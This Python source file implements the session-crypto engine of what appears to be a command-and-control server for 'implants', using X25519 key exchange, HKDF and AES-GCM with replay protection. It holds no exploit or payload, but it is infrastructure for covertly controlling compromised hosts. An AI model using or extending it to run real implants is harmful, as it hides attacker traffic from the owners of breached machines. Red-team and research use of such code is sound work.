
import os
import sys
import struct
import base64

from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

try:
    from Crypto.Cipher import AES
    _PYCRYPTO_OK = True
except ImportError:
    _PYCRYPTO_OK = False
    # Fallback: use cryptography library's AES-GCM
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        _CRYPTOGRAPHY_AES_OK = True
    except ImportError:
        _CRYPTOGRAPHY_AES_OK = False


class C2CryptoEngine:
    """
    Manages per-agent session cryptography.

    Key derivation uses HKDF-SHA256. Raw ECDH output is NEVER used directly.
    Sequence numbers in AAD provide replay protection.
    """

    def __init__(self, key_dir: str = "data/keys"):
        self.key_dir = key_dir
        os.makedirs(key_dir, exist_ok=True)

        # Legacy X25519 keypair for backward compatibility with v9 implants
        self._legacy_priv_path = os.path.join(key_dir, "server_x25519_private.pem")
        self._legacy_pub_path = os.path.join(key_dir, "server_x25519_public.pem")
        self.private_key = None
        self.public_key = None
        self._load_or_generate_legacy()

        # agent_id -> {"key": bytes, "rx_seq": int, "tx_seq": int, "epoch": int}
        self.agent_state = {}

    def _load_or_generate_legacy(self):
        """Load or generate legacy X25519 keypair for backward compat."""
        if not _PYCRYPTO_OK:
            return

        if os.path.exists(self._legacy_priv_path):
            with open(self._legacy_priv_path, "rb") as f:
                self.private_key = serialization.load_pem_private_key(f.read(), password=None)
            self.public_key = self.private_key.public_key()
        else:
            self.private_key = x25519.X25519PrivateKey.generate()
            self.public_key = self.private_key.public_key()

            with open(self._legacy_priv_path, "wb") as f:
                f.write(self.private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            with open(self._legacy_pub_path, "wb") as f:
                f.write(self.public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                ))

    def derive_shared_key(self, client_pub_bytes: bytes) -> bytes:
        """
        Derive session key from client's X25519 public key.
        Uses HKDF — raw ECDH output is never used directly.
        """
        client_pub = x25519.X25519PublicKey.from_public_bytes(client_pub_bytes)
        raw_shared = self.private_key.exchange(client_pub)

        # HKDF derivation
        session_key = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b"octopus-session-v10",
        ).derive(raw_shared)

        return session_key

    def decrypt_aes_gcm(self, agent_id: str, b64_ciphertext: str) -> str:
        """Decrypt with Replay Protection via AAD Sequence Numbers."""
        if agent_id not in self.agent_state:
            raise ValueError("Agent crypto state not found")

        state = self.agent_state[agent_id]
        ciphertext = base64.b64decode(b64_ciphertext)

        # Format: [8 bytes seq][12 bytes nonce][ciphertext][16 bytes tag]
        seq_bytes = ciphertext[:8]
        nonce = ciphertext[8:20]
        data = ciphertext[20:-16]
        tag = ciphertext[-16:]

        rx_seq = struct.unpack("<Q", seq_bytes)[0]
        if rx_seq <= state["rx_seq"]:
            raise ValueError(f"Replay attack detected! Seq {rx_seq} <= {state['rx_seq']}")

        if _PYCRYPTO_OK:
            cipher = AES.new(state["key"], AES.MODE_GCM, nonce=nonce)
            cipher.update(seq_bytes)  # AAD
            plaintext = cipher.decrypt_and_verify(data, tag)
        else:
            # Fallback: cryptography library
            aesgcm = AESGCM(state["key"])
            # AESGCM expects nonce + ciphertext + tag concatenated
            plaintext = aesgcm.decrypt(nonce, data + tag, seq_bytes)

        state["rx_seq"] = rx_seq
        return plaintext.decode('utf-8')

    def encrypt_aes_gcm(self, agent_id: str, plaintext: str) -> str:
        """Encrypt and inject monotonic sequence into AAD."""
        if agent_id not in self.agent_state:
            raise ValueError("Agent crypto state not found")

        state = self.agent_state[agent_id]
        state["tx_seq"] += 1
        seq_bytes = struct.pack("<Q", state["tx_seq"])

        if _PYCRYPTO_OK:
            cipher = AES.new(state["key"], AES.MODE_GCM)
            cipher.update(seq_bytes)  # AAD
            ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode('utf-8'))
            full_payload = seq_bytes + cipher.nonce + ciphertext + tag
        else:
            # Fallback: cryptography library
            nonce = os.urandom(12)
            aesgcm = AESGCM(state["key"])
            ct_with_tag = aesgcm.encrypt(nonce, plaintext.encode('utf-8'), seq_bytes)
            # ct_with_tag = ciphertext + tag (tag is last 16 bytes)
            full_payload = seq_bytes + nonce + ct_with_tag

        return base64.b64encode(full_payload).decode('utf-8')

